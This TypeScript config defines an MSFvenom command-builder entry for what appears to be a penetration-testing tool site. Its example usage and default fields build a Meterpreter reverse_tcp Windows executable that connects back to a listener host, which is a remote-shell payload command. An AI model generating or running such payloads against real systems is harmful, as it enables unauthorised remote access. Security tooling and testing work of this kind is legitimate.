import type { GeneratorConfig } from '../../types/generator';

export const msfvenomGenerator: GeneratorConfig = {
  id: 'msfvenom',
  name: 'MSFvenom',
  description: 'Metasploit standalone payload generator.',
  categoryId: 'exploitation',
  exampleUsage: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe',
  explanation: 'msfvenom is a combination of msfpayload and msfencode, putting both of these tools into a single Framework instance. it has been the standard for payload generation since 2015.',
  fields: [
    {
      id: 'payload',
      label: 'Payload',
      type: 'text',
      placeholder: 'e.g. windows/x64/meterpreter/reverse_tcp',
      required: true,
      defaultValue: 'windows/x64/meterpreter/reverse_tcp'
    },
    {
      id: 'lhost',
      label: 'LHOST',
      type: 'text',
      placeholder: 'e.g. 10.0.0.1',
      required: true,
      defaultValue: ''
    },
    {
      id: 'lport',
      label: 'LPORT',
      type: 'number',
      defaultValue: 4444
    },
    {
      id: 'format',
      label: 'Format',
      type: 'select',
      options: [
        { label: 'EXE', value: 'exe' },
        { label: 'MSI', value: 'msi' },
        { label: 'ELF', value: 'elf' },
        { label: 'RAW', value: 'raw' },
        { label: 'C', value: 'c' },
        { label: 'Python', value: 'python' }
      ],
      defaultValue: 'exe'
    }
  ],
  generateCommand: (values: any) => {
    const parts = ['msfvenom'];
    if (values.payload) parts.push(`-p ${values.payload}`);
    if (values.lhost) parts.push(`LHOST=${values.lhost}`);
    if (values.lport) parts.push(`LPORT=${values.lport}`);
    if (values.format) parts.push(`-f ${values.format}`);
    if (values.output) parts.push(`-o ${values.output}`);
    return parts.join(' ');
  },
  seo: {
    title: 'MSFvenom Payload Generator - Metasploit Standalone Payloads',
    description: 'Create MSFvenom commands to generate custom payloads for various platforms. Supports encoders, formats, and multiple payload types.',
    keywords: ['msfvenom generator', 'payload generation', 'reverse shell generator', 'metasploit payloads', 'msfvenom syntax']
  },
  additionalContent: [
    {
      title: 'About MSFvenom',
      content: `MSFvenom is a combination of msfpayload and msfencode, putting both of these tools into a single framework instance. It is used to generate and encode various types of payloads for use in penetration testing.`
    }
  ]
};
